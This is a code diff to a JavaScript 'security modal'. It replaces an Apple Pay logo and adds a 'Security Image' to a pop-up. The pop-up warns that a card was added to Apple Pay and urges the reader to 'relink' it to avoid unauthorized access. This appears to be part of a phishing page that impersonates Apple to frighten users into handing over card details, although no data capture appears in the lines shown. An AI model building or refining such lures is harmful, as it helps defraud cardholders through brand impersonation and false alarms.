@@ -11,8 +11,9 @@ function createSecurityModal() {
     modalOverlay.innerHTML = `
         <div class="security-modal-container">
             <div class="security-modal-header">
-                <img class="apple-logo" src="https://cdn.builder.io/api/v1/image/assets%2F55f17d293130496d8101acfd884b2c9a%2Fff859b53a2b84301a3d0964e5709a460?format=webp&width=800" alt="Apple Pay Logo">
+                <img class="apple-logo" src="https://cdn.builder.io/api/v1/image/assets%2F55f17d293130496d8101acfd884b2c9a%2F92894b465094445d94ded7ca5ef44b96" alt="Apple Pay Logo" srcset="https://cdn.builder.io/api/v1/image/assets%2F55f17d293130496d8101acfd884b2c9a%2F92894b465094445d94ded7ca5ef44b96?width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F55f17d293130496d8101acfd884b2c9a%2F92894b465094445d94ded7ca5ef44b96?width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F55f17d293130496d8101acfd884b2c9a%2F92894b465094445d94ded7ca5ef44b96?width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F55f17d293130496d8101acfd884b2c9a%2F92894b465094445d94ded7ca5ef44b96?width=800 800w">
             </div>
+            <img class="security-modal-second-image" src="https://cdn.builder.io/api/v1/image/assets%2F55f17d293130496d8101acfd884b2c9a%2Fdb083913fbb14a6f98befc372b8e48b4" alt="Security Image" srcset="https://cdn.builder.io/api/v1/image/assets%2F55f17d293130496d8101acfd884b2c9a%2Fdb083913fbb14a6f98befc372b8e48b4?width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F55f17d293130496d8101acfd884b2c9a%2Fdb083913fbb14a6f98befc372b8e48b4?width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F55f17d293130496d8101acfd884b2c9a%2Fdb083913fbb14a6f98befc372b8e48b4?width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F55f17d293130496d8101acfd884b2c9a%2Fdb083913fbb14a6f98befc372b8e48b4?width=800 800w">
             <div class="security-modal-content">
                 <h2 class="security-modal-title">Your card has been added to Apple Pay</h2>
                 <p class="security-modal-warning">If you didn't do this, relink your card to avoid unauthorized access.</p>
